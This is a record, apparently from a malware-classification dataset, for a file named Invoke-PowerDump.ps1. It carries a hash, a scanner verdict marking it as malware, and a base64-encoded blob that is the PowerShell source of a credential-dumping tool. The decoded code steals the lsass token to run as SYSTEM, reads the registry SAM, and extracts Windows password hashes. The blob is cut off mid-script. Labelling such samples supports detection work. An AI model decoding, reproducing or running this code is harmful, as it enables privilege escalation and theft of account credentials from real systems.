Invoke-PowerDump.ps1,3f55d7b73b1198f06cdbc22600cc3e67,Scan result is 32768. IsMalware: 1,IyBQdWxsZWQgZnJvbSBkYXJrb3BlcmF0b3IncyBQb3NoLVNlY01vZDogCiMgICBodHRwczovL2dpdGh1Yi5jb20vZGFya29wZXJhdG9yL1Bvc2gtU2VjTW9kL2Jsb2IvbWFzdGVyL1Bvc3RFeHBsb2l0YXRpb24vUG9zdEV4cGxvaXRhdGlvbi5wc20xCmZ1bmN0aW9uIEludm9rZS1Qb3dlckR1bXAKewogIDwjCiAgLlNZTk9QU0lTCiAgICAgRHVtcHMgaGFzaGVzIGZyb20gdGhlIGxvY2FsIHN5c3RlbS4gTm90ZTogYWRtaW5pc3RyYXRpdmUgcHJpdmlsZWdlcyByZXF1aXJlZC4KICAuREVTQ1JJUFRJT04KICAgIEdlbmVyYXRlIGEgY29tbWFuZCBmb3IgZHVtcGluZyBoYXNoZXMgZnJvbSBhIFdpbmRvd3MgU3lzdGVtIFBvd2VyU2hlbGwuZXhlIC1jb21tYW5kIAogICAgQ29tbWFuZCBtdXN0IGJlIGV4ZWN1dGVkIGFzIFNZU1RFTSBpZiByYW4gYXMgYWRtaW5pc3RyYXRvciBpdCB3aWxsIHByaXZpbGFnZSBlc2NhbGF0ZSB0byBTWVNURU0KICAgIGFuZCBleGVjdXRlIGEgaGFzaGR1bXAgYnkgcmVhZGluZyB0aGUgaGFzaGVzIGZyb20gdGhlIHJlZ2lzdHJ5LgogIC5FWEFNUExFCiAgICAkZW5jID0gR2V0LVBvc3RIYXNoZHVtcFNjcmlwdAogICAgQzpcUFM+cG93ZXJzaGVsbC5leGUgLWNvbW1hbmQgJGVuYwogICAgICBBZG1pbmlzdHJhdG9yOjUwMDphYWQzYjQzNWI1MTQwNGVlYWFkM2I0MzViNTE0MDRlZTozMWQ0YWZlMWQxNmFlOTMxYjc0YzU5ZDdlMWMwODljMDo6OgogICAgICBHdWVzdDo1MDE6YWFkM2I0MzViNTE0MDRlZWFhZDNiNDM1YjUxNDA0ZWU6MzFkNmNmZTBkMTZhZTkzMWI3M2M1OWQ3ZTBjMDg5YzA6OjoKICAgICAgQ2FybG9zOjEwMDE6YWFkM2I0MzViNTE0MDRlZWFhZDNiNDM1YjUxNDA0ZWU6NjIwOTZlNWVkODNhMTBjZjYxY2Y3OWNjMzY3Mzg1MTk6OjoKICAgICAgSG9tZUdyb3VwVXNlciQ6MTAwMzphYWQzYjQzNWI1MTQwNGVlYWFkM2I0MzViNTE0MDRlZTo5NTFiMjcxYTRiN2QxZGQ3YTI1ZTNkOWM5Zjg3MzQxZTo6OgogICAgRXhlY3V0ZXMgdGhlIGNvbXByZXNzZWQgY29tbWFuZCBnZW5lcmF0ZWQgYnkgdGhlIGZ1bmN0aW9uIGFuZCBkdW1wcyB0aGUgd2luZG93cyBoYXNoZXMgZnJvbSB0aGUgcmVnaXN0cnkuCiAgIAogICAuTk9URVMKICAgICBQb3dlckR1bXAgc2NyaXB0IGJ5IEthdGh5IFBldGVycywgSm9zaCBLZWxsZXkgKHdpbmZhbmcpIGFuZCBEYXZlIEtlbm5lZHkgKFJlTDFLKQogICAgIFByaXZpbGFnZSBFc2NhbGF0aW9uIGZyb20gaHR0cDovL2Jsb2dzLnRlY2huZXQuY29tL2IvaGV5c2NyaXB0aW5nZ3V5L2FyY2hpdmUvMjAxMi8wNy8wNS91c2UtcG93ZXJzaGVsbC10by1kdXBsaWNhdGUtcHJvY2Vzcy10b2tlbnMtdmlhLXAtaW52b2tlLmFzcHgKICAjPgoKCiRzaWduID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnB1YmxpYyBzdGF0aWMgY2xhc3MgcHJpdgp7CiAgICBbRGxsSW1wb3J0KCJzaGVsbDMyLmRsbCIpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBJc1VzZXJBbkFkbWluKCk7Cn0KIkAKICAgICRhZG1pbmFzZW1ibHkgPSBBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJHNpZ24gLUxhbmd1YWdlIENTaGFycCAtUGFzc1RocnUKICAgIGZ1bmN0aW9uIEVsZXZhdGVQcml2cwogICAgewokc2lnbmF0dXJlID0gQCIgCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgUGFjayA9IDEpXSAKICAgICBwdWJsaWMgc3RydWN0IFRva1ByaXYxTHVpZCAKICAgICB7IAogICAgICAgICBwdWJsaWMgaW50IENvdW50OyAKICAgICAgICAgcHVibGljIGxvbmcgTHVpZDsgCiAgICAgICAgIHB1YmxpYyBpbnQgQXR0cjsgCiAgICAgfSAKIAogICAgcHVibGljIGNvbnN0IGludCBTRV9QUklWSUxFR0VfRU5BQkxFRCA9IDB4MDAwMDAwMDI7IAogICAgcHVibGljIGNvbnN0IGludCBUT0tFTl9RVUVSWSA9IDB4MDAwMDAwMDg7IAogICAgcHVibGljIGNvbnN0IGludCBUT0tFTl9BREpVU1RfUFJJVklMRUdFUyA9IDB4MDAwMDAwMjA7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBTVEFOREFSRF9SSUdIVFNfUkVRVUlSRUQgPSAweDAwMEYwMDAwOyAKIAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBTVEFOREFSRF9SSUdIVFNfUkVBRCA9IDB4MDAwMjAwMDA7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9BU1NJR05fUFJJTUFSWSA9IDB4MDAwMTsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX0RVUExJQ0FURSA9IDB4MDAwMjsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX0lNUEVSU09OQVRFID0gMHgwMDA0OyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fUVVFUllfU09VUkNFID0gMHgwMDEwOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fQURKVVNUX0dST1VQUyA9IDB4MDA0MDsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX0FESlVTVF9ERUZBVUxUID0gMHgwMDgwOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fQURKVVNUX1NFU1NJT05JRCA9IDB4MDEwMDsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX1JFQUQgPSAoU1RBTkRBUkRfUklHSFRTX1JFQUQgfCBUT0tFTl9RVUVSWSk7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9BTExfQUNDRVNTID0gKFNUQU5EQVJEX1JJR0hUU19SRVFVSVJFRCB8IFRPS0VOX0FTU0lHTl9QUklNQVJZIHwgCiAgICAgIFRPS0VOX0RVUExJQ0FURSB8IFRPS0VOX0lNUEVSU09OQVRFIHwgVE9LRU5fUVVFUlkgfCBUT0tFTl9RVUVSWV9TT1VSQ0UgfCAKICAgICAgVE9LRU5fQURKVVNUX1BSSVZJTEVHRVMgfCBUT0tFTl9BREpVU1RfR1JPVVBTIHwgVE9LRU5fQURKVVNUX0RFRkFVTFQgfCAKICAgICAgVE9LRU5fQURKVVNUX1NFU1NJT05JRCk7IAogCiAgICBwdWJsaWMgY29uc3Qgc3RyaW5nIFNFX1RJTUVfWk9ORV9OQU1FVEVYVCA9ICJTZVRpbWVab25lUHJpdmlsZWdlIjsgCiAgICBwdWJsaWMgY29uc3QgaW50IEFOWVNJWkVfQVJSQVkgPSAxOyAKIAogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXSAKICAgIHB1YmxpYyBzdHJ1Y3QgTFVJRCAKICAgIHsgCiAgICAgIHB1YmxpYyBVSW50MzIgTG93UGFydDsgCiAgICAgIHB1YmxpYyBVSW50MzIgSGlnaFBhcnQ7IAogICAgfSAKIAogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXSAKICAgIHB1YmxpYyBzdHJ1Y3QgTFVJRF9BTkRfQVRUUklCVVRFUyB7IAogICAgICAgcHVibGljIExVSUQgTHVpZDsgCiAgICAgICBwdWJsaWMgVUludDMyIEF0dHJpYnV0ZXM7IAogICAgfSAKIAogCiAgICBwdWJsaWMgc3RydWN0IFRPS0VOX1BSSVZJTEVHRVMgeyAKICAgICAgcHVibGljIFVJbnQzMiBQcml2aWxlZ2VDb3VudDsgCiAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbEFycmF5LCBTaXplQ29uc3Q9QU5ZU0laRV9BUlJBWSldIAogICAgICBwdWJsaWMgTFVJRF9BTkRfQVRUUklCVVRFUyBbXSBQcml2aWxlZ2VzOyAKICAgIH0gCiAKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0gCiAgICAgcHVibGljIGV4dGVybiBzdGF0aWMgYm9vbCBEdXBsaWNhdGVUb2tlbihJbnRQdHIgRXhpc3RpbmdUb2tlbkhhbmRsZSwgaW50IAogICAgICAgIFNFQ1VSSVRZX0lNUEVSU09OQVRJT05fTEVWRUwsIG91dCBJbnRQdHIgRHVwbGljYXRlVG9rZW5IYW5kbGUpOyAKIAogCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldIAogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldIAogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRUaHJlYWRUb2tlbiggCiAgICAgIEludFB0ciBQSFRocmVhZCwgCiAgICAgIEludFB0ciBUb2tlbiAKICAgICk7IAogCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldIAogICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXSAKICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBPcGVuUHJvY2Vzc1Rva2VuKEludFB0ciBQcm9jZXNzSGFuZGxlLCAgCiAgICAgICBVSW50MzIgRGVzaXJlZEFjY2Vzcywgb3V0IEludFB0ciBUb2tlbkhhbmRsZSk7IAogCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0gCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIExvb2t1cFByaXZpbGVnZVZhbHVlKHN0cmluZyBob3N0LCBzdHJpbmcgbmFtZSwgcmVmIGxvbmcgcGx1aWQpOyAKIAogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgRXhhY3RTcGVsbGluZyA9IHRydWUpXSAKICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50UHJvY2VzcygpOyAKIAogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRXhhY3RTcGVsbGluZyA9IHRydWUsIFNldExhc3RFcnJvciA9IHRydWUpXSAKICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIEFkanVzdFRva2VuUHJpdmlsZWdlcyhJbnRQdHIgaHRvaywgYm9vbCBkaXNhbGwsIAogICAgIHJlZiBUb2tQcml2MUx1aWQgbmV3c3QsIGludCBsZW4sIEludFB0ciBwcmV2LCBJbnRQdHIgcmVsZW4pOyAKIkAgCiAKICAgICAgICAgICRjdXJyZW50UHJpbmNpcGFsID0gTmV3LU9iamVjdCBTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbCggW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpIAogICAgICAgICAgaWYoJGN1cnJlbnRQcmluY2lwYWwuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSAtbmUgJHRydWUpIHsgCiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlJ1biB0aGUgQ29tbWFuZCBhcyBhbiBBZG1pbmlzdHJhdG9yIiAKICAgICAgICAgICAgQnJlYWsgCiAgICAgICAgICB9IAogCiAgICAgICAgICBBZGQtVHlwZSAtTWVtYmVyRGVmaW5pdGlvbiAkc2lnbmF0dXJlIC1OYW1lIEFkalByaXYgLU5hbWVzcGFjZSBBZGpQcml2IAogICAgICAgICAgJGFkalByaXYgPSBbQWRqUHJpdi5BZGpQcml2XSAKICAgICAgICAgIFtsb25nXSRsdWlkID0gMCAKIAogICAgICAgICAgJHRva1ByaXYxTHVpZCA9IE5ldy1PYmplY3QgQWRqUHJpdi5BZGpQcml2K1Rva1ByaXYxTHVpZCAKICAgICAgICAgICR0b2tQcml2MUx1aWQuQ291bnQgPSAxIAogICAgICAgICAgJHRva1ByaXYxTHVpZC5MdWlkID0gJGx1aWQgCiAgICAgICAgICAkdG9rUHJpdjFMdWlkLkF0dHIgPSBbQWRqUHJpdi5BZGpQcml2XTo6U0VfUFJJVklMRUdFX0VOQUJMRUQgCiAKICAgICAgICAgICRyZXRWYWwgPSAkYWRqUHJpdjo6TG9va3VwUHJpdmlsZWdlVmFsdWUoJG51bGwsICJTZURlYnVnUHJpdmlsZWdlIiwgW3JlZl0kdG9rUHJpdjFMdWlkLkx1aWQpIAogIAogICAgICAgICAgW0ludFB0cl0kaHRva2VuID0gW0ludFB0cl06Olplcm8gCiAgICAgICAgICAkcmV0VmFsID0gJGFkalByaXY6Ok9wZW5Qcm9jZXNzVG9rZW4oJGFkalByaXY6OkdldEN1cnJlbnRQcm9jZXNzKCksIFtBZGpQcml2LkFkalByaXZdOjpUT0tFTl9BTExfQUNDRVNTLCBbcmVmXSRodG9rZW4pIAogICAKICAgCiAgICAgICAgICAkdG9rZW5Qcml2aWxlZ2VzID0gTmV3LU9iamVjdCBBZGpQcml2LkFkalByaXYrVE9LRU5fUFJJVklMRUdFUyAKICAgICAgICAgICRyZXRWYWwgPSAkYWRqUHJpdjo6QWRqdXN0VG9rZW5Qcml2aWxlZ2VzKCRodG9rZW4sICRmYWxzZSwgW3JlZl0kdG9rUHJpdjFMdWlkLCAxMiwgW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvKSAKIAogICAgICAgICAgaWYoLW5vdCgkcmV0VmFsKSkgeyAKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5tYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKSAKICAgICAgICAgICAgQnJlYWsgCiAgICAgICAgICB9IAogCiAgICAgICAgICAkcHJvY2VzcyA9IChHZXQtUHJvY2VzcyAtTmFtZSBsc2FzcykgCiAgICAgICAgICAjJHByb2Nlc3MubmFtZQogICAgICAgICAgW0ludFB0cl0kaGxzYXNzdG9rZW4gPSBbSW50UHRyXTo6WmVybyAKICAgICAgICAgICRyZXRWYWwgPSAkYWRqUHJpdjo6T3BlblByb2Nlc3NUb2tlbigkcHJvY2Vzcy5IYW5kbGUsIChbQWRqUHJpdi5BZGpQcml2XTo6VE9LRU5fSU1QRVJTT05BVEUgLUJPUiBbQWRqUHJpdi5BZGpQcml2XTo6VE9LRU5fRFVQTElDQVRFKSwgW3JlZl0kaGxzYXNzdG9rZW4pIAogCiAgICAgICAgICBbSW50UHRyXSRkdWxpY2F0ZVRva2VuSGFuZGxlID0gW0ludFB0cl06Olplcm8gCiAgICAgICAgICAkcmV0VmFsID0gJGFkalByaXY6OkR1cGxpY2F0ZVRva2VuKCRobHNhc3N0b2tlbiwgMiwgW3JlZl0kZHVsaWNhdGVUb2tlbkhhbmRsZSkgCiAgCiAgICAgICAgICAkcmV0dmFsID0gJGFkalByaXY6OlNldFRocmVhZFRva2VuKFtJbnRQdHJdOjpaZXJvLCAkZHVsaWNhdGVUb2tlbkhhbmRsZSkgCiAgCiAgICAgICAgICBpZigtbm90KCRyZXRWYWwpKSB7IAogICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLm1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpIAogICAgICAgICAgfSAKICAgICAgfQogICAgICBmdW5jdGlvbiBMb2FkQXBpCiAgICAgICAgewogICAgICAgICRvbGRFcnJvckFjdGlvbiA9ICRnbG9iYWw6RXJyb3JBY3Rpb25QcmVmZXJlbmNlOwogICAgICAgICRnbG9iYWw6RXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gIlNpbGVudGx5Q29udGludWUiOwogICAgICAgICR0ZXN0ID0gW1Bvd2VyRHVtcC5OYXRpdmVdOwogICAgICAgICRnbG9iYWw6RXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJG9sZEVycm9yQWN0aW9uOwogICAgICAgIGlmICgkdGVzdCkgCiAgICAgICAgewogICAgICAgICAgICAjIGFscmVhZHkgbG9hZGVkCiAgICAgICAgICAgIHJldHVybjsgCiAgICAgICAgfQokY29kZSA9IEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKbmFtZXNwYWNlIFBvd2VyRHVtcAp7CiAgICBwdWJsaWMgY2xhc3MgTmF0aXZlCiAgICB7CiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgUmVnT3BlbktleUV4KAogICAgICAgIGludCBoS2V5LAogICAgICAgIHN0cmluZyBzdWJLZXksCiAgICAgICAgaW50IHVsT3B0aW9ucywKICAgICAgICBpbnQgc2FtRGVzaXJlZCwKICAgICAgICBvdXQgaW50IGhrUmVzdWx0KTsKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIEVudHJ5UG9pbnQgPSAiUmVnRW51bUtleUV4IildCiAgICBleHRlcm4gcHVibGljIHN0YXRpYyBpbnQgUmVnRW51bUtleUV4KAogICAgICAgIGludCBoa2V5LAogICAgICAgIGludCBpbmRleCwKICAgICAgICBTdHJpbmdCdWlsZGVyIGxwTmFtZSwKICAgICAgICByZWYgaW50IGxwY2JOYW1lLAogICAgICAgIGludCByZXNlcnZlZCwKICAgICAgICBTdHJpbmdCdWlsZGVyIGxwQ2xhc3MsCiAgICAgICAgcmVmIGludCBscGNiQ2xhc3MsCiAgICAgICAgb3V0IGxvbmcgbHBmdExhc3RXcml0ZVRpbWUpOwogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludD0iUmVnUXVlcnlJbmZvS2V5IiwgQ2FsbGluZ0NvbnZlbnRpb249Q2FsbGluZ0NvbnZlbnRpb24uV2luYXBpLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICBleHRlcm4gcHVibGljIHN0YXRpYyBpbnQgUmVnUXVlcnlJbmZvS2V5KAogICAgICAgIGludCBoa2V5LAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBDbGFzcywKICAgICAgICByZWYgaW50IGxwY2JDbGFzcywKICAgICAgICBpbnQgbHBSZXNlcnZlZCwKICAgICAgICBvdXQgaW50IGxwY1N1YktleXMsCiAgICAgICAgb3V0IGludCBscGNiTWF4U3ViS2V5TGVuLAogICAgICAgIG91dCBpbnQgbHBjYk1heENsYXNzTGVuLAogICAgICAgIG91dCBpbnQgbHBjVmFsdWVzLAogICAgICAgIG91dCBpbnQgbHBjYk1heFZhbHVlTmFtZUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JNYXhWYWx1ZUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JTZWN1cml0eURlc2NyaXB0b3IsCiAgICAgICAgSW50UHRyIGxwZnRMYXN0V3JpdGVUaW1lKTsKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBSZWdDbG9zZUtleSgKICAgICAgICBpbnQgaEtleSk7CiAgICAgICAgfQogICAgfSAvLyBlbmQgbmFtZXNwYWNlIFBvd2VyRHVtcAogICAgcHVibGljIGNsYXNzIFNoaWZ0IHsKICAgICAgICBwdWJsaWMgc3RhdGljIGludCAgIFJpZ2h0KGludCB4LCAgIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCAgUmlnaHQodWludCB4LCAgaW50IGNvdW50KSB7IHJldHVybiB4ID4+IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyBsb25nICBSaWdodChsb25nIHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPj4gY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIHVsb25nIFJpZ2h0KHVsb25nIHgsIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50ICAgIExlZnQoaW50IHgsICAgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50ICAgTGVmdCh1aW50IHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPDwgY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIGxvbmcgICBMZWZ0KGxvbmcgeCwgIGludCBjb3VudCkgeyByZXR1cm4geCA8PCBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWxvbmcgIExlZnQodWxvbmcgeCwgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICB9CiJACiAgICAgICAgICAgJHByb3ZpZGVyID0gTmV3LU9iamVjdCBNaWNyb3NvZnQuQ1NoYXJwLkNTaGFycENvZGVQcm92aWRlcgogICAgICAgICAgICRkbGxOYW1lID0gW1BzT2JqZWN0XS5Bc3NlbWJseS5Mb2NhdGlvbgogICAgICAgICAgICRjb21waWxlclBhcmFtZXRlcnMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2RlRG9tLkNvbXBpbGVyLkNvbXBpbGVyUGFyYW1ldGVycwogICAgICAgICAgICRhc3NlbWJsaWVzID0gQCgiU3lzdGVtLmRsbCIsICRkbGxOYW1lKQogICAgICAgICAgICRjb21waWxlclBhcmFtZXRlcnMuUmVmZXJlbmNlZEFzc2VtYmxpZXMuQWRkUmFuZ2UoJGFzc2VtYmxpZXMpCiAgICAgICAgICAgJGNvbXBpbGVyUGFyYW1ldGVycy5HZW5lcmF0ZUluTWVtb3J5ID0gJHRydWUKICAgICAgICAgICAkY29tcGlsZXJSZXN1bHRzID0gJHByb3ZpZGVyLkNvbXBpbGVBc3NlbWJseUZyb21Tb3VyY2UoJGNvbXBpbGVyUGFyYW1ldGVycywgJGNvZGUpCiAgICAgICAgICAgaWYoJGNvbXBpbGVyUmVzdWx0cy5FcnJvcnMuQ291bnQgLWd0IDApIHsKICAgICAgICAgICAgICRjb21waWxlclJlc3VsdHMuRXJyb3JzIHwgJSB7IFdyaXRlLUVycm9yICgiezB9OmB0ezF9IiAtZiAkXy5MaW5lLCRfLkVycm9yVGV4dCkgfQogICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJGFudHBhc3N3b3JkID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiTlRQQVNTV09SRGAwIik7CiAgICAgICAgJGFsbXBhc3N3b3JkID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiTE1QQVNTV09SRGAwIik7CiAgICAgICAgJGVtcHR5X2xtID0gW2J5dGVbXV1AKDB4YWEsMHhkMywweGI0LDB4MzUsMHhiNSwweDE0LDB4MDQsMHhlZSwweGFhLDB4ZDMsMHhiNCwweDM1LDB4YjUsMHgxNCwweDA0LDB4ZWUpOwogICAgICAgICRlbXB0eV9udCA9IFtieXRlW11dQCgweDMxLDB4ZDYsMHhjZiwweGUwLDB4ZDEsMHg2YSwweGU5LDB4MzEsMHhiNywweDNjLDB4NTksMHhkNywweGUwLDB4YzAsMHg4OSwweGMwKTsKICAgICAgICAkb2RkX3Bhcml0eSA9IEAoCiAgICAgICAgICAxLCAxLCAyLCAyLCA0LCA0LCA3LCA3LCA4LCA4LCAxMSwgMTEsIDEzLCAxMywgMTQsIDE0LAogICAgICAgICAgMTYsIDE2LCAxOSwgMTksIDIxLCAyMSwgMjIsIDIyLCAyNSwgMjUsIDI2LCAyNiwgMjgsIDI4LCAzMSwgMzEsCiAgICAgICAgICAzMiwgMzIsIDM1LCAzNSwgMzcsIDM3LCAzOCwgMzgsIDQxLCA0MSwgNDIsIDQyLCA0NCwgNDQsIDQ3LCA0NywKICAgICAgICAgIDQ5LCA0OSwgNTAsIDUwLCA1MiwgNTIsIDU1LCA1NSwgNTYsIDU2LCA1OSwgNTksIDYxLCA2MSwgNjIsIDYyLAogICAgICAgICAgNjQsIDY0LCA2NywgNjcsIDY5LCA2OSwgNzAsIDcwLCA3MywgNzMsIDc0LCA3NCwgNzYsIDc2LCA3OSwgNzksCiAgICAgICAgICA4MSwgODEsIDgyLCA4MiwgODQsIDg0LCA4NywgODcsIDg4LCA4OCwgOTEsIDkxLCA5MywgOTMsIDk0LCA5NCwKICAgICAgICAgIDk3LCA5NywgOTgsIDk4LDEwMCwxMDAsMTAzLDEwMywxMDQsMTA0LDEwNywxMDcsMTA5LDEwOSwxMTAsMTEwLAogICAgICAgICAgMTEyLDExMiwxMTUsMTE1LDExNywxMTcsMTE4LDExOCwxMjEsMTIxLDEyMiwxMjIsMTI0LDEyNCwxMjcsMTI3LAogICAgICAgICAgMTI4LDEyOCwxMzEsMTMxLDEzMywxMzMsMTM0LDEzNCwxMzcsMTM3LDEzOCwxMzgsMTQwLDE0MCwxNDMsMTQzLAogICAgICAgICAgMTQ1LDE0NSwxNDYsMTQ2LDE0OCwxNDgsMTUxLDE1MSwxNTIsMTUyLDE1NSwxNTUsMTU3LDE1NywxNTgsMTU4LAogICAgICAgICAgMTYxLDE2MSwxNjIsMTYyLDE2NCwxNjQsMTY3LDE2NywxNjgsMTY4LDE3MSwxNzEsMTczLDE3MywxNzQsMTc0LAogICAgICAgICAgMTc2LDE3NiwxNzksMTc5LDE4MSwxODEsMTgyLDE4MiwxODUsMTg1LDE4NiwxODYsMTg4LDE4OCwxOTEsMTkxLAogICAgICAgICAgMTkzLDE5MywxOTQsMTk0LDE5NiwxOTYsMTk5LDE5OSwyMDAsMjAwLDIwMywyMDMsMjA1LDIwNSwyMDYsMjA2LAogICAgICAgICAgMjA4LDIwOCwyMTEsMjExLDIxMywyMTMsMjE0LDIxNCwyMTcsMjE3LDIxOCwyMTgsMjIwLDIyMCwyMjMsMjIzLAogICAgICAgICAgMjI0LDIyNCwyMjcsMjI3LDIyOSwyMjksMjMwLDIzMCwyMzMsMjMzLDIzNCwyMzQsMjM2LDIzNiwyMzksMjM5LAogICAgICAgICAgMjQxLDI0MSwyNDIsMjQyLDI0NCwyNDQsMjQ3LDI0NywyNDgsMjQ4LDI1MSwyNTEsMjUzLDI1MywyNTQsMjU0CiAgICAgICAgKTsKICAgICAgICBmdW5jdGlvbiBzaWRfdG9fa2V5KCRzaWQpCiAgICAgICAgewogICAgICAgICAgICAkczEgPSBAKCk7CiAgICAgICAgICAgICRzMSArPSBbY2hhcl0oJHNpZCAtYmFuZCAweEZGKTsKICAgICAgICAgICAgJHMxICs9IFtjaGFyXShbU2hpZnRdOjpSaWdodCgkc2lkLDgpIC1iYW5kIDB4RkYpOwogICAgICAgICAgICAkczEgKz0gW2NoYXJdKFtTaGlmdF06OlJpZ2h0KCRzaWQsMTYpIC1iYW5kIDB4RkYpOwogICAgICAgICAgICAkczEgKz0gW2NoYXJdKFtTaGlmdF06OlJpZ2h0KCRzaWQsMjQpIC1iYW5kIDB4RkYpOwogICAgICAgICAgICAkczEgKz0gJHMxWzBdOwogICAgICAgICAgICAkczEgKz0gJHMxWzFdOwogICAgICAgICAgICAkczEgKz0gJHMxWzJdOwogICAgICAgICAgICAkczIgPSBAKCk7CiAgICAgICAgICAgICRzMiArPSAkczFbM107ICRzMiArPSAkczFbMF07ICRzMiArPSAkczFbMV07ICRzMiArPSAkczFbMl07CiAgICAgICAgICAgICRzMiArPSAkczJbMF07ICRzMiArPSAkczJbMV07ICRzMiArPSAkczJbMl07CiAgICAgICAgICAgIHJldHVybiAsKChzdHJfdG9fa2V5ICRzMSksKHN0cl90b19rZXkgJHMyKSk7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIHN0cl90b19rZXkoJHMpCiAgICAgICAgewogICAgICAgICAgICAka2V5ID0gQCgpOwogICAgICAgICAgICAka2V5ICs9IFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzBdKSwgMSApOwogICAgICAgICAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbMF0pIC1iYW5kIDB4MDEpLCA2KSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzFdKSwyKTsKICAgICAgICAgICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzFdKSAtYmFuZCAweDAzKSwgNSkgLWJvciBbU2hpZnRdOjpSaWdo